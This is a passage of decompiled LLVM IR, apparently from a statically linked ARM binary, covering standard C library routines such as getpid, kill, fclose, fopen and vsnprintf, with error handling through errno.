  br i1 %v2_ab2c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_ab34 = phi i32 [ %v2_ab28, %entry ], [ 4096, %bb ]
  ret i32 %v1_ab34

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ab3c = load i32, i32* @r4, align 4
  store i32 %v3_ab3c, i32* %stack_var_-8, align 4
  %v0_ab40 = call i32 @getpid()
  store i32 %v0_ab40, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ab40, -4095
  br i1 %tmp, label %dec_label_pc_ab60, label %dec_label_pc_ab50

dec_label_pc_ab50:                                ; preds = %entry
  %v0_ab50 = call i32 @__errno_location()
  %v0_ab54 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab54 = sub i32 0, %v0_ab54
  %v2_ab58 = inttoptr i32 %v0_ab50 to i32*
  store i32 %v1_ab54, i32* %v2_ab58, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %entry, %dec_label_pc_ab50
  %v0_ab60 = phi i32 [ %v0_ab40, %entry ], [ -1, %dec_label_pc_ab50 ]
  %v2_ab64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ab64, i32* @r4, align 4
  ret i32 %v0_ab60

; uselistorder directives
  uselistorder i32 %v0_ab40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab60, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ab68 = load i32, i32* @r4, align 4
  store i32 %v3_ab68, i32* %stack_var_-8, align 4
  %v0_ab6c = call i32 @getppid()
  store i32 %v0_ab6c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ab6c, -4095
  br i1 %tmp, label %dec_label_pc_ab8c, label %dec_label_pc_ab7c

dec_label_pc_ab7c:                                ; preds = %entry
  %v0_ab7c = call i32 @__errno_location()
  %v0_ab80 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab80 = sub i32 0, %v0_ab80
  %v2_ab84 = inttoptr i32 %v0_ab7c to i32*
  store i32 %v1_ab80, i32* %v2_ab84, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ab8c

dec_label_pc_ab8c:                                ; preds = %entry, %dec_label_pc_ab7c
  %v0_ab8c = phi i32 [ %v0_ab6c, %entry ], [ -1, %dec_label_pc_ab7c ]
  %v2_ab90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ab90, i32* @r4, align 4
  ret i32 %v0_ab8c

; uselistorder directives
  uselistorder i32 %v0_ab6c, { 1, 0, 2 }
  uselistorder i32 ()* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_ab8c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_abb0 = load i32, i32* @r0, align 4
  %v3_abb0 = call i32 @ioctl(i32 %v0_abb0, i32 %arg1, i32 %arg2)
  store i32 %v3_abb0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_abb0, -4095
  br i1 %tmp, label %dec_label_pc_abd0, label %dec_label_pc_abc0

dec_label_pc_abc0:                                ; preds = %entry
  %v0_abc0 = call i32 @__errno_location()
  %v0_abc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_abc4 = sub i32 0, %v0_abc4
  %v2_abc8 = inttoptr i32 %v0_abc0 to i32*
  store i32 %v1_abc4, i32* %v2_abc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_abd0

dec_label_pc_abd0:                                ; preds = %entry, %dec_label_pc_abc0
  %v0_abd0 = phi i32 [ %v3_abb0, %entry ], [ -1, %dec_label_pc_abc0 ]
  ret i32 %v0_abd0

; uselistorder directives
  uselistorder i32 %v3_abb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_abd0, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_abe4 = load i32, i32* @r4, align 4
  store i32 %v3_abe4, i32* %stack_var_-8, align 4
  %v0_abe8 = call i32 @kill()
  store i32 %v0_abe8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_abe8, -4095
  br i1 %tmp, label %dec_label_pc_ac08, label %dec_label_pc_abf8

dec_label_pc_abf8:                                ; preds = %entry
  %v0_abf8 = call i32 @__errno_location()
  %v0_abfc = load i32, i32* %r4.global-to-local, align 4
  %v1_abfc = sub i32 0, %v0_abfc
  %v2_ac00 = inttoptr i32 %v0_abf8 to i32*
  store i32 %v1_abfc, i32* %v2_ac00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac08

dec_label_pc_ac08:                                ; preds = %entry, %dec_label_pc_abf8
  %v0_ac08 = phi i32 [ %v0_abe8, %entry ], [ -1, %dec_label_pc_abf8 ]
  %v2_ac0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ac0c, i32* @r4, align 4
  ret i32 %v0_ac08

; uselistorder directives
  uselistorder i32 %v0_abe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac08, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ac10 = load i32, i32* @r4, align 4
  store i32 %v3_ac10, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ac38, label %dec_label_pc_ac28

dec_label_pc_ac28:                                ; preds = %entry
  %v0_ac28 = call i32 @__errno_location()
  %v0_ac2c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac2c = sub i32 0, %v0_ac2c
  %v2_ac30 = inttoptr i32 %v0_ac28 to i32*
  store i32 %v1_ac2c, i32* %v2_ac30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_ac3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ac38

dec_label_pc_ac38:                                ; preds = %entry, %dec_label_pc_ac28
  %v2_ac3c = phi i32 [ %v3_ac10, %entry ], [ %v2_ac3c.pre, %dec_label_pc_ac28 ]
  %v0_ac38 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_ac28 ]
  store i32 %v2_ac3c, i32* @r4, align 4
  ret i32 %v0_ac38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac38, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ac40 = load i32, i32* @r4, align 4
  store i32 %v3_ac40, i32* %stack_var_-8, align 4
  %v2_ac44 = call i32 @time(i32* %arg1)
  store i32 %v2_ac44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_ac44, -4095
  br i1 %tmp, label %dec_label_pc_ac64, label %dec_label_pc_ac54

dec_label_pc_ac54:                                ; preds = %entry
  %v0_ac54 = call i32 @__errno_location()
  %v0_ac58 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac58 = sub i32 0, %v0_ac58
  %v2_ac5c = inttoptr i32 %v0_ac54 to i32*
  store i32 %v1_ac58, i32* %v2_ac5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %entry, %dec_label_pc_ac54
  %v0_ac64 = phi i32 [ %v2_ac44, %entry ], [ -1, %dec_label_pc_ac54 ]
  %v2_ac68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ac68, i32* @r4, align 4
  ret i32 %v0_ac64

; uselistorder directives
  uselistorder i32 %v2_ac44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac64, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_ac70 = call i32 @wait4()
  ret i32 %v0_ac70
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ac74 = load i32, i32* @r4, align 4
  store i32 %v3_ac74, i32* %stack_var_-8, align 4
  %v3_ac78 = load i32, i32* @r2, align 4
  %v4_ac78 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_ac78)
  store i32 %v4_ac78, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_ac78, -4095
  br i1 %tmp, label %dec_label_pc_ac98, label %dec_label_pc_ac88

dec_label_pc_ac88:                                ; preds = %entry
  %v0_ac88 = call i32 @__errno_location()
  %v0_ac8c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac8c = sub i32 0, %v0_ac8c
  %v2_ac90 = inttoptr i32 %v0_ac88 to i32*
  store i32 %v1_ac8c, i32* %v2_ac90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %entry, %dec_label_pc_ac88
  %v0_ac98 = phi i32 [ %v4_ac78, %entry ], [ -1, %dec_label_pc_ac88 ]
  %v2_ac9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ac9c, i32* @r4, align 4
  ret i32 %v0_ac98

; uselistorder directives
  uselistorder i32 %v4_ac78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac98, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_aca8 = icmp slt i32 %arg1, 0
  br i1 %v1_aca8, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_aca8 = mul i32 %arg1, 2
  %v2_acb4 = load i32, i32* @global_var_1d470, align 4
  %v2_acb8 = add i32 %v2_acb4, %v2_aca8
  %v3_acbc = inttoptr i32 %v2_acb8 to i8*
  %v4_acbc = load i8, i8* %v3_acbc, align 1
  %v6_acbc = zext i8 %v4_acbc to i32
  %v1_acc0 = add i32 %v2_acb8, 1
  %v2_acc0 = inttoptr i32 %v1_acc0 to i8*
  %v3_acc0 = load i8, i8* %v2_acc0, align 1
  %v4_acc0 = zext i8 %v3_acc0 to i32
  %v3_acc4 = mul nuw i32 %v4_acc0, 16777216
  %v4_acc8 = sdiv i32 %v3_acc4, 65536
  %v5_acc8 = or i32 %v4_acc8, %v6_acbc
  ret i32 %v5_acc8

; uselistorder directives
  uselistorder i32 %v2_acb8, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1fe28.402 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ace0 = load i32, i32* @r4, align 4
  store i32 %v3_ace0, i32* %stack_var_-32, align 4
  %v6_ace0 = load i32, i32* @r5, align 4
  %v9_ace0 = load i32, i32* @r6, align 4
  %v12_ace0 = load i32, i32* @r7, align 4
  %v15_ace0 = load i32, i32* @r8, align 4
  %v2_ace4 = add i32 %tmp, 52
  %v3_ace4 = inttoptr i32 %v2_ace4 to i32*
  %v4_ace4 = load i32, i32* %v3_ace4, align 4
  store i32 %v4_ace4, i32* @r8, align 4
  %v2_ace8 = add i32 %tmp, 56
  store i32 %v2_ace8, i32* @r5, align 4
  %v2_acec = ptrtoint i32* %stack_var_-64 to i32
  %v2_acf0 = icmp eq i32 %v4_ace4, 0
  store i1 %v2_acf0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_ad00 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_ad00, i32* @r0, align 4
  br i1 %v2_acf0, label %dec_label_pc_ad08, label %dec_label_pc_ad24

dec_label_pc_ad08:                                ; preds = %entry
  store i32 58724, i32* %r3.global-to-local, align 4
  %v1_ad10 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r3.global-to-local, align 4
  %v1_ad20 = call i32 @__pthread_return_0()
  %v0_ad24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad24

dec_label_pc_ad24:                                ; preds = %entry, %dec_label_pc_ad08
  %v0_ad2c = phi i32 [ %tmp, %entry ], [ %v0_ad24.pre, %dec_label_pc_ad08 ]
  %v1_ad24 = inttoptr i32 %v0_ad2c to i8*
  %v2_ad24 = load i8, i8* %v1_ad24, align 1
  %v3_ad24 = zext i8 %v2_ad24 to i32
  %v1_ad28 = and i32 %v3_ad24, 64
  store i32 %v1_ad28, i32* %r3.global-to-local, align 4
  %v2_ad28 = icmp eq i32 %v1_ad28, 0
  store i1 %v2_ad28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ad28, i32* @r7, align 4
  br i1 %v2_ad28, label %dec_label_pc_ad40, label %dec_label_pc_ad38

dec_label_pc_ad38:                                ; preds = %dec_label_pc_ad24
  %v3_ad38 = call i32 @fflush_unlocked(i8* %v1_ad24)
  store i32 %v3_ad38, i32* @r7, align 4
  %v0_ad40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad24, %dec_label_pc_ad38
  %v0_ad40 = phi i32 [ %v0_ad2c, %dec_label_pc_ad24 ], [ %v0_ad40.pre, %dec_label_pc_ad38 ]
  %v1_ad40 = add i32 %v0_ad40, 4
  %v2_ad40 = inttoptr i32 %v1_ad40 to i32*
  %v3_ad40 = load i32, i32* %v2_ad40, align 4
  %v1_ad44 = call i32 @__libc_close(i32 %v3_ad40)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_ad4c = icmp slt i32 %v1_ad44, 0
  %v2_ad4c = icmp eq i32 %v1_ad44, 0
  store i1 %v2_ad4c, i1* %cpsr_z.global-to-local, align 1
  %v1_ad50 = load i32, i32* @r4, align 4
  %v2_ad50 = add i32 %v1_ad50, 4
  %v3_ad50 = inttoptr i32 %v2_ad50 to i32*
  store i32 -1, i32* %v3_ad50, align 4
  store i32 %v2_acec, i32* @r0, align 4
  br i1 %v1_ad4c, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_ad40
  %v3_ad64 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_ad64, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_ad40, %bb
  %v1_ad70 = call i32 @__pthread_return_void()
  %v1_ad7c = call i32 @__pthread_return_0()
  %v2_ad84 = load i32, i32* @global_var_1dc04.410, align 4
  %v1_ad88 = add i32 %v2_ad84, 1
  store i32 %v1_ad88, i32* %r3.global-to-local, align 4
  store i32 %v1_ad88, i32* @global_var_1dc04.410, align 4
  store i32 %v2_acec, i32* @r0, align 4
  %v1_ada0 = call i32 @__pthread_return_void()
  %v0_ada4 = load i32, i32* @r4, align 4
  %v1_ada4 = inttoptr i32 %v0_ada4 to i32*
  %v2_ada4 = load i32, i32* %v1_ada4, align 4
  %v1_ada8 = and i32 %v2_ada4, 24576
  store i32 %v1_ada8, i32* %r3.global-to-local, align 4
  %v3_adac1 = udiv i32 %v1_ada8, 256
  %v1_adb0 = trunc i32 %v3_adac1 to i8
  %v3_adb0 = add i32 %v0_ada4, 1
  %v4_adb0 = inttoptr i32 %v3_adb0 to i8*
  store i8 %v1_adb0, i8* %v4_adb0, align 1
  %v0_adb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_adb4 = trunc i32 %v0_adb4 to i8
  %v2_adb4 = load i32, i32* @r4, align 4
  %v3_adb4 = inttoptr i32 %v2_adb4 to i8*
  store i8 %v1_adb4, i8* %v3_adb4, align 1
  %v0_adb8 = load i32, i32* @r4, align 4
  %v1_adb8 = inttoptr i32 %v0_adb8 to i32*
  %v2_adb8 = load i32, i32* %v1_adb8, align 4
  %v1_adbc = or i32 %v2_adb8, 48
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v3_adc0 = sdiv i32 %v2_adb8, 256
  %v0_adc4 = load i32, i32* @r8, align 4
  %v2_adc4 = icmp eq i32 %v0_adc4, 0
  store i1 %v2_adc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_ad00, i32* @r0, align 4
  %v1_add4 = trunc i32 %v3_adc0 to i8
  %v3_add4 = add i32 %v0_adb8, 1
  %v4_add4 = inttoptr i32 %v3_add4 to i8*
  store i8 %v1_add4, i8* %v4_add4, align 1
  %v0_add8 = load i32, i32* %r3.global-to-local, align 4
  %v1_add8 = trunc i32 %v0_add8 to i8
  %v2_add8 = load i32, i32* @r4, align 4
  %v3_add8 = inttoptr i32 %v2_add8 to i8*
  store i8 %v1_add8, i8* %v3_add8, align 1
  %v0_addc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_addc, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_ade0 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_ade4 = load i32, i32* @r4, align 4
  %v1_ade4 = add i32 %v0_ade4, 1
  %v2_ade4 = inttoptr i32 %v1_ade4 to i8*
  %v3_ade4 = load i8, i8* %v2_ade4, align 1
  %v4_ade4 = zext i8 %v3_ade4 to i32
  store i32 %v4_ade4, i32* %r3.global-to-local, align 4
  %v1_ade8 = and i32 %v4_ade4, 64
  %v2_ade8 = icmp eq i32 %v1_ade8, 0
  store i1 %v2_ade8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ade8, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_adf0 = xor i1 %v2_ade8, true
  call void @__pseudo_cond_branch(i1 %v1_adf0, i32 ptrtoint (i32* @global_var_d4a4.412 to i32))
  store i32 %v2_acec, i32* @r0, align 4
  %v1_ae04 = call i32 @__pthread_return_void()
  %v1_ae10 = call i32 @__pthread_return_0()
  %v2_ae18 = load i32, i32* @global_var_1dc08.415, align 4
  %v1_ae1c = add i32 %v2_ae18, 1
  store i32 %v1_ae1c, i32* %r3.global-to-local, align 4
  store i32 %v2_acec, i32* @r0, align 4
  store i32 %v1_ae1c, i32* @global_var_1dc08.415, align 4
  %v1_ae30 = call i32 @__pthread_return_void()
  %v1_ae34 = call i32 @_stdio_openlist_dec_use(i32 %v1_ae30)
  %v0_ae38 = load i32, i32* @r7, align 4
  %v2_ae40 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_ae40, i32* @r4, align 4
  store i32 %v6_ace0, i32* @r5, align 4
  store i32 %v9_ace0, i32* @r6, align 4
  store i32 %v12_ace0, i32* @r7, align 4
  store i32 %v15_ace0, i32* @r8, align 4
  ret i32 %v0_ae38

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_ad40, { 1, 0 }
  uselistorder label %dec_label_pc_ad24, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_ae68 = call i32 @_stdio_fopen()
  ret i32 %v0_ae68
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_ae78 = call i32 @__GI_vsnprintf()
  ret i32 %v0_ae78
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_ae88 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_ae88, i32* @ip, align 4
  store i32 %v2_ae88, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_ae9c = call i32 @__GI_vsnprintf()
  ret i32 %v0_ae9c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_aeb0 = load i32, i32* @r4, align 4
  %v6_aeb0 = load i32, i32* @r5, align 4
  %v12_aeb0 = load i32, i32* @r7, align 4
  %v15_aeb0 = load i32, i32* @r8, align 4
  %v18_aeb0 = load i32, i32* @sl, align 4
  %v0_aeb4 = load i32, i32* @r3, align 4
  store i32 %v0_aeb4, i32* @r8, align 4
  %v2_aeb8 = ptrtoint i32* %stack_var_-108 to i32
  %v0_aec0 = load i32, i32* @r0, align 4
  %v1_aec0 = sub i32 -1, %v0_aec0
  store i32 %v1_aec0, i32* @r5, align 4
  store i32 %v0_aec0, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_aed4 = load i32, i32* @r1, align 4
  %v3_aed4 = icmp ult i32 %v1_aec0, %v1_aed4
  br i1 %v3_aed4, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_aed4, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_aedc = load i32, i32* @r2, align 4
  store i32 %v0_aedc, i32* @r7, align 4
  %v2_aee0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_aee0, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  store i32 1, i32* @r3, align 4
  %v0_aefc = call i32 @__stdio_init_mutex()
  %v0_af00 = load i32, i32* @r4, align 4
  %v1_af00 = load i32, i32* @r5, align 4
  %v2_af00 = add i32 %v1_af00, %v0_af00
  %v0_af08 = load i32, i32* @r7, align 4
  %v0_af0c = load i32, i32* @r8, align 4
  %v0_af18 = load i32, i32* @sl, align 4
  %v12_af2c = inttoptr i32 %v0_af08 to i8*
  %v13_af2c = call i32 @_vfprintf_internal(i32 %v2_aeb8, i8* %v12_af2c, i32 %v0_af0c, i32 %v2_af00, i32 %v0_af00, i32 %v2_af00, i32 %v0_af00, i32 %v0_af00, i32 %v0_af00, i32 %v2_af00, i32 %v0_af18)
  %v0_af30 = load i32, i32* @r5, align 4
  %v1_af30 = load i32, i32* @sl, align 4
  %v9_af30 = icmp eq i32 %v0_af30, %v1_af30
  br i1 %v9_af30, label %dec_label_pc_af58, label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %bb23
  %v9_af44 = icmp eq i32 %v1_af00, 0
  %v1_af48 = sext i1 %v9_af44 to i32
  %v1_af48.v0_af10 = add i32 %v0_af00, %v1_af48
  %stack_var_-92.0 = inttoptr i32 %v1_af48.v0_af10 to i8*
  %v1_af54 = trunc i32 %v1_af30 to i8
  store i8 %v1_af54, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_af58

dec_label_pc_af58:                                ; preds = %bb23, %dec_label_pc_af3c
  store i32 %v3_aeb0, i32* @r4, align 4
  store i32 %v6_aeb0, i32* @r5, align 4
  store i32 %v12_aeb0, i32* @r7, align 4
  store i32 %v15_aeb0, i32* @r8, align 4
  store i32 %v18_aeb0, i32* @sl, align 4
  ret i32 %v13_af2c

; uselistorder directives
  uselistorder i32 %v1_af00, { 1, 0 }
  uselistorder i32 %v0_af00, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_aed4, { 1, 0 }
  uselistorder i32 %v0_aec0, { 1, 0 }
  uselistorder label %dec_label_pc_af58, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_af60 = load i32, i32* @r4, align 4
  store i32 %v3_af60, i32* %stack_var_-24, align 4
  %v6_af60 = load i32, i32* @r5, align 4
  %v9_af60 = load i32, i32* @r6, align 4
  %v15_af60 = load i32, i32* @r8, align 4
  %v0_af64 = load i32, i32* @r1, align 4
  %v1_af64 = inttoptr i32 %v0_af64 to i8*
  %v2_af64 = load i8, i8* %v1_af64, align 1
  %v3_af64 = zext i8 %v2_af64 to i32
  store i32 %v3_af64, i32* @ip, align 4
  %v7_af68 = icmp eq i8 %v2_af64, 114
  store i1 %v7_af68, i1* %cpsr_z.global-to-local, align 1
  %v2_af6c = ptrtoint i32* %stack_var_-56 to i32
  %v0_af70 = load i32, i32* @r0, align 4
  store i32 %v0_af70, i32* @r6, align 4
  %v0_af74 = load i32, i32* @r2, align 4
  store i32 %v0_af74, i32* @r8, align 4
  %v0_af78 = load i32, i32* @r3, align 4
  store i32 %v0_af78, i32* @r5, align 4
  br i1 %v7_af68, label %dec_label_pc_afc4, label %dec_label_pc_af80

dec_label_pc_af80:                                ; preds = %entry
  %v7_af80 = icmp eq i8 %v2_af64, 119
  store i1 %v7_af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af80, label %bb, label %dec_label_pc_af8c

bb:                                               ; preds = %dec_label_pc_af80
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_afc8

dec_label_pc_af8c:                                ; preds = %dec_label_pc_af80
  %v7_af8c = icmp eq i8 %v2_af64, 97
  store i1 %v7_af8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af8c, label %bb30, label %dec_label_pc_af98

bb30:                                             ; preds = %dec_label_pc_af8c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_afc8

dec_label_pc_af98:                                ; preds = %dec_label_pc_af8c, %dec_label_pc_b050, %dec_label_pc_b024
  %v0_af98 = call i32 @__errno_location()
  store i32 %v0_af98, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_afa0 = load i32, i32* @r8, align 4
  %v2_afa0 = icmp eq i32 %v0_afa0, 0
  store i1 %v2_afa0, i1* %cpsr_z.global-to-local, align 1
  %v2_afa4 = inttoptr i32 %v0_af98 to i32*
  store i32 22, i32* %v2_afa4, align 4
  br i1 %v2_afa0, label %dec_label_pc_b218, label %dec_label_pc_afac

dec_label_pc_afac:                                ; preds = %dec_label_pc_b074._crit_edge, %dec_label_pc_af98
  %v0_afac = load i32, i32* @r8, align 4
  %v1_afac = add i32 %v0_afac, 1
  %v2_afac = inttoptr i32 %v1_afac to i8*
  %v3_afac = load i8, i8* %v2_afac, align 1
  %v4_afac = zext i8 %v3_afac to i32
  store i32 %v4_afac, i32* %r3.global-to-local, align 4
  %v1_afb0 = and i32 %v4_afac, 32
  %v2_afb0 = icmp eq i32 %v1_afb0, 0
  store i1 %v2_afb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afb0, label %dec_label_pc_b218, label %dec_label_pc_afb8

dec_label_pc_afb8:                                ; preds = %dec_label_pc_afac
  store i32 %v0_afac, i32* @r0, align 4
  %v0_afbc = call i32 @free()
  store i32 %v0_afbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b218

dec_label_pc_afc4:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_afc8

dec_label_pc_afc8:                                ; preds = %bb, %bb30, %dec_label_pc_afc4
  %v1_afe0 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_afc4 ]
  %v1_afc8 = add i32 %v0_af64, 1
  %v2_afc8 = inttoptr i32 %v1_afc8 to i8*
  %v3_afc8 = load i8, i8* %v2_afc8, align 1
  %v7_afcc = icmp eq i8 %v3_afc8, 98
  store i1 %v7_afcc, i1* %cpsr_z.global-to-local, align 1
  %v1_afc8.v0_af64 = select i1 %v7_afcc, i32 %v1_afc8, i32 %v0_af64
  store i32 %v1_afc8.v0_af64, i32* %r3.global-to-local, align 4
  %v1_afd8 = add i32 %v1_afc8.v0_af64, 1
  %v2_afd8 = inttoptr i32 %v1_afd8 to i8*
  %v3_afd8 = load i8, i8* %v2_afd8, align 1
  %v4_afd8 = zext i8 %v3_afd8 to i32
  store i32 %v4_afd8, i32* %r3.global-to-local, align 4
  %v7_afdc = icmp eq i8 %v3_afd8, 43
  store i1 %v7_afdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_afdc, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_afc8
  store i32 %v1_afe0, i32* %r3.global-to-local, align 4
  %v2_afe4 = add nuw nsw i32 %v1_afe0, 1
  store i32 %v2_afe4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_afc8, %bb33
  %v2_afe8 = icmp eq i32 %v0_af74, 0
  store i1 %v2_afe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afe8, label %dec_label_pc_aff0, label %dec_label_pc_b01c

dec_label_pc_aff0:                                ; preds = %.thread4
